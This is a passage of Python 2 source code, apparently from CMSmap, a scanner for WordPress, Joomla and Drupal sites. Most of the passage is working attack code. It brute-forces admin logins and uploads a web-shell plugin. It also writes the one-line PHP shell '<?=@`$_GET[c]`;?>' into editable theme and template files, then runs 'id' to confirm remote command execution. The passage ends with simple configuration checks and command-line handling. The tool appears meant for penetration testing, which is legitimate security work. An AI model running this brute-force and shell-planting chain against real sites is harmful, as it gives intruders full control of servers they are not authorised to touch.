                            self.JooValidCredentials.append([user,pwd])
                    except urllib2.HTTPError, e:
                        #print e.code
                        pass
            for JooCredential in self.JooValidCredentials :
                PostExploit(self.url).JooShell(JooCredential[0], JooCredential[1])

        def Drurun(self):
            self.drulogin = "/?q=user/login";
            for user in self.usrlist:
                for pwd in self.pswlist:
                    query_args = {"name": user ,"pass": pwd, "form_id":"user_login"}
                    data = urllib.urlencode(query_args)
                    # HTTP POST Request
                    req = urllib2.Request(self.url+self.drulogin, data,self.headers)
                    #print "[*] Trying Credentials: "+user+" "+pwd
                    try:
                        htmltext = urllib2.urlopen(req).read()
                        if re.findall(re.compile('Sorry, too many failed login attempts from your IP address.'),htmltext):
                            print "[!] Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
                            return
                              
                    except urllib2.HTTPError, e:
                        #print e.code
                        if e.code == 403:
                            print "[*] Valid Credentials: "+user+" "+pwd
                
class PostExploit:
    def __init__(self,url):
        self.url = url
        
    def WPShell(self,user,password):
        self.wplogin = "/wp-login.php"
        self.wpupload = "/wp-admin/update.php?action=upload-plugin"
        self.wppluginpage = "/wp-admin/plugin-install.php?tab=upload"
        self.query_args_login = {"log": user ,"pwd": password, "wp-submit":"Log+In"}
        # Set cookies
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        opener = urllib2.build_opener(cookieHandler,multipartpost.MultipartPostHandler)
        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
        cookieJar.clear()
        try: 
            # Login in WordPress - HTTP Post
            if verbose : print "[-] Logining on the target website ..."
            opener.open(self.url+self.wplogin, urllib.urlencode(self.query_args_login))
            # Request WordPress Plugin Upload page
            htmltext = opener.open(self.url+self.wppluginpage).read()
            self.wpnonce = re.findall(re.compile('name="_wpnonce" value="(.+?)"'),htmltext) 
            # Upload Plugin
            self.params = { "_wpnonce" : self.wpnonce[0],"pluginzip" : open("wp-shell.zip", "rb") , "install-plugin-submit":"Install Now"}
            htmltext = opener.open(self.url+self.wpupload, self.params).read()
            if re.search("Plugin installed successfully",htmltext):
                print_red("[!] CMSmap WordPress Shell Plugin Installed")
                print_red_bold("[!] Web Shell: "+self.url+"/wp-content/plugins/wp-shell/shell.php")
                print_yellow("[-] Remember to delete CMSmap WordPress Shell Plugin")
        
        except urllib2.HTTPError, e:
            #print e.code
            pass           
            

    def WPwritableThemes(self,user,password):
        self.theme = WPScan(self.url,threads).WPCurrentTheme()
        self.wplogin = "/wp-login.php"
        self.wpThemePage = "/wp-admin/theme-editor.php"
        self.query_args_login = {"log": user ,"pwd": password, "wp-submit":"Log+In"}
        self.shell = "<?=@`$_GET[c]`;?>"
        # Set cookies
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        opener = urllib2.build_opener(cookieHandler)
        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
        cookieJar.clear()
        
        try:
            # HTTP POST Request
            if verbose : print "[-] Logining on the target website ..."
            opener.open(self.url+self.wplogin, urllib.urlencode(self.query_args_login))
            
            if verbose : print "[-] Looking for Theme Editor Page on the target website ..."
            htmltext = opener.open(self.url+self.wpThemePage).read()
            tempPages = re.findall(re.compile('href=\"theme-editor\.php\?file=(.+?)\.php'),htmltext)
            
            if verbose : print "[-] Looking for a writable theme page on the target website ..."
            for tempPage in tempPages:      
                htmltext = opener.open(self.url+"/wp-admin/theme-editor.php"+"?file="+tempPage+".php&theme="+self.theme).read()
                if re.search('value="Update File"', htmltext) :
                    print "[*] Writable theme page found : "+ tempPage+".php"
                    self.wpnonce = re.findall(re.compile('name="_wpnonce" value="(.+?)"'),htmltext)              
                    self.phpCode = re.findall('<textarea.*>(.+?)</textarea>',htmltext,re.S)
                    
                    if verbose : print "[-] Creating a theme page with a PHP shell on the target website ..." 
                    self.newcontent = self.shell+self.phpCode[0].decode('utf8').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace("&#039;", "'")
        
                    query_args = {"_wpnonce": self.wpnonce[0],"newcontent": self.newcontent,"action":"update","file":tempPage+".php","theme":self.theme,"submit":"Update+File"}
                    data = urllib.urlencode(query_args)
                    
                    print "[-] Updating a new theme page with a PHP shell on the target website ..." 
                    opener.open(self.url+"/wp-admin/theme-editor.php",data).read()
                    
                    htmltext = urllib.urlopen(self.url+"/wp-content/themes/"+self.theme+"/"+tempPage+".php?c=id").read()
                    if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                        print "[*] Web shell Found: " + self.url+"/wp-content/themes/"+self.theme+"/"+tempPage+".php?c=id"
                        print "[*] $ id"
                        print htmltext
                        # shell found then exit
                        sys.exit()
        except urllib2.HTTPError, e:
            #print e.code
            pass
        
    def JooShell(self,user,password):
        self.joologin = "/administrator/index.php"
        self.jooThemePage = "/administrator/index.php?option=com_templates"
        self.shell = "<?=@`$_GET[c]`;?>"
        
        # Set cookies
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        opener = urllib2.build_opener(cookieHandler)
        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
        cookieJar.clear()
        
        try:
            # HTTP POST Request
            if verbose : print "[-] Logining on the target website ..."
            # Get Token and Session Cookie
            htmltext = opener.open(self.url+self.joologin).read()
            reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
            token = reg.search(htmltext).group(1)            
            # Logining on the website with username and password
            query_args = {"username": user ,"passwd": password, "option":"com_login","task":"login",token:"1"}
            data = urllib.urlencode(query_args)
            htmltext = opener.open(self.url+self.joologin, data).read()
            
            if verbose : print "[-] Looking for Administrator Template on the target website ..."
            htmltext = opener.open(self.url+self.jooThemePage).read()
            # Gets template IDs
            tempPages = re.findall(re.compile('view=template&amp;id=(.+?) ">'),htmltext)
            
            if verbose : print "[-] Looking for a writable themplate on the target website ..."
            for tempPage in tempPages:
                # For each template ID   
                htmltext = opener.open(self.url+"/administrator/index.php?option=com_templates&task=source.edit&id="+base64.b64encode(tempPage+":index.php")).read()
                template = re.findall(re.compile('template "(.+?)"\.</legend>'),htmltext)
                if verbose : print "[-] Joomla template Found: "+ template[0]
                # Gets phpCode and Token
                self.phpCode = re.findall('<textarea.*>(.+?)</textarea>',htmltext,re.S)
                self.token = re.findall(re.compile("logout&amp;(.+?)=1\">Logout"),htmltext)
                # Decode phpCode and add a shell
                self.newcontent = self.shell+self.phpCode[0].decode('utf8').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace("&#039;", "'")
                query_args = {"jform[source]": self.newcontent,"task": "source.apply",self.token[0]:"1","jform[extension_id]":tempPage,"jform[filename]":"index.php"}
                data = urllib.urlencode(query_args)
                # Send request
                if verbose : print "[-] Updating a new template with a PHP shell on the target website ..." 
                htmltext = opener.open(self.url+"/administrator/index.php?option=com_templates&layout=edit",data).read()
                
                if not re.search('Error',htmltext,re.IGNORECASE):
                # If not error, then find shell
                    htmltext = urllib.urlopen(self.url+"/templates/"+template[0]+"/"+"index.php?c=id").read()
                    if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                        # Front end template
                        print "[*] Web shell Found: " + self.url+"/templates/"+template[0]+"/"+"index.php?c=id"
                        print "[*] $ id"
                        print htmltext
                        # shell found then exit
                        sys.exit()
                    else:
                        htmltext = urllib.urlopen(self.url+"/administrator/templates/"+template[0]+"/"+"index.php?c=id").read()
                        # Back end template
                        if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                            print "[*] Web shell Found: " + self.url+"/administrator/templates/"+template[0]+"/"+"index.php?c=id"
                            print "[*] $ id"
                            print htmltext
                            # shell found then exit
                            sys.exit()
                else:
                    if verbose: print "[-] Not Writable Joomla template: "+ template[0]
                
        except urllib2.HTTPError, e:
            # print e.code
            pass

class GenericChecks:
    def __init__(self,url):
        self.url = url
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        # autocompletation
        # clear text : http or https
        # directory listing 
        
    def DirectoryListing(self,relPath):
        self.relPath = relPath
        try:
            req = urllib2.Request(self.url+self.relPath,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            dirList = re.search("<title>Index of", htmltext,re.IGNORECASE)
            if dirList: print_green("[*] Directory Listing Enabled: "+self.url+self.relPath)
        except urllib2.HTTPError, e:
            pass
        
    def HTTPSCheck(self):
        pUrl = urlparse.urlparse(self.url)
        #clean up supplied URLs
        scheme = pUrl.scheme.lower()
        if scheme == 'http' : print "[*] Website Not in HTTPS: "+self.url

    def AutocompleteOff(self,relPath):
        self.relPath = relPath
        try:
            req = urllib2.Request(self.url+self.relPath,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            autoComp = re.search("autocomplete=\"off\"", htmltext,re.IGNORECASE)
            if not autoComp : print "[*] Autocomplete Off Not Found: "+self.url+self.relPath
        except urllib2.HTTPError, e:
            pass
        
    def RobotsTXT(self):
        req = urllib2.Request(self.url+"/robots.txt",None,self.headers)
        try:
            urllib2.urlopen(req)
            print "[*] Robots.txt Found: " +self.url+"/robots.txt"
        except urllib2.HTTPError, e:
            #print e.code
            pass

# Global Variables =============================================================================================

pluginsFound = []
themesFound = []
version=0.3
verbose = False
threads = 5
print_red = lambda x: cprint(x, 'red', None, file=sys.stderr)
print_red_bold = lambda x: cprint(x, 'red', attrs=['bold'], file=sys.stderr)
print_grey = lambda x: cprint(x, 'grey', None, file=sys.stderr)
print_grey_bold = lambda x: cprint(x, 'grey', attrs=['bold'], file=sys.stderr)
print_green = lambda x: cprint(x, 'green', None, file=sys.stderr)
print_green_bold = lambda x: cprint(x, 'green', attrs=['bold'], file=sys.stderr)
print_yellow = lambda x: cprint(x, 'yellow', None, file=sys.stderr)
print_yellow_bold = lambda x: cprint(x, 'yellow', attrs=['bold'], file=sys.stderr)
print_blue = lambda x: cprint(x, 'blue', None, file=sys.stderr)
print_blue_bold = lambda x: cprint(x, 'blue', attrs=['bold'], file=sys.stderr)

# Global Methos =================================================================================================

def WriteTextFile(fn,s):
    f = open(fn,"w")
    f.write(s)
    f.close()
    
def usage(version):
    print "CMSmap tool v"+str(version)+" - Simple CMS Scanner\nAuthor: Mike Manzotti mike.manzotti@dionach.com\nUsage: " + os.path.basename(sys.argv[0]) + """ -u <URL>
          -u, --url      target URL (e.g. 'https://abc.test.com:8080/')
          -v, --verbose  verbose mode (Default: false)
          -t, --threads  number of threads (Default: 5)
          -U, --usr      username or file 
          -P, --psw      password or file 
          -h, --help 
          """
    print "Example: "+ os.path.basename(sys.argv[0]) +" -u https://example.com"
    print "         "+ os.path.basename(sys.argv[0]) +" -u https://example.com -U admin -P passwords.txt"
    
if __name__ == "__main__":
    # command line arguments
    if sys.argv[1:]:
        try:
            optlist, args = getopt.getopt(sys.argv[1:], 'u:U:P:t:vh', ["url=", "version", "help","usr","psw","threads"])
        except getopt.GetoptError as err:
            # print help information and exit:
            print(err) # print something like "option -a not recognized"
            usage(version)
            sys.exit(2)  
        for o, a in optlist:
            if o == "-h":
                usage(version)
                sys.exit()
            elif o in ("-u", "--url"):
                url = a
                pUrl = urlparse.urlparse(url)
                #clean up supplied URLs
                netloc = pUrl.netloc.lower()
                scheme = pUrl.scheme.lower()
                path = pUrl.path.lower()
                if not scheme:
                    print 'VALIDATION ERROR: http(s):// prefix required'
                    exit(1)
            elif o in ("-U", "--usr"):
                usrlist = a
            elif o in ("-P", "--psw"):
                pswlist = a
            elif o in ("-t", "--threads"):
                threads = int(a)
                print_grey("[-] Threads Set : "+str(threads))
            elif o == "-v":
                verbose = True
            else:
                usage(version)
                sys.exit()
    else:
        usage(version)
        sys.exit()
        
    start = time.time()
    print_blue("[-] Date & Time: ", time.strftime('%d/%m/%Y %H:%M:%S'))
    
    # if plugins don't exist (first time of running) then initialize
    if not os.path.exists('wp_plugins.txt' or 'joomla_plugins.txt' or 'drupal_plugins.txt'):
        initializer = Initialize()
        initializer.GetWordPressPlugins()
        initializer.GetJoomlaPluginsExploitDB()
        initializer.GetWordpressPluginsExploitDB()
        initializer.GetDrupalPlugins()
    
    try:
        BruteForcer(url,usrlist,pswlist).FindCMSType()
    except NameError:
        Scanner(url,threads).FindCMSType()
    
    end = time.time()
    diffTime = end - start
    print_blue("[-] Date & Time: ", time.strftime('%d/%m/%Y %H:%M:%S'))
    print "[-] Scan Completed in: "+str(datetime.timedelta(seconds=diffTime)).split(".")[0]
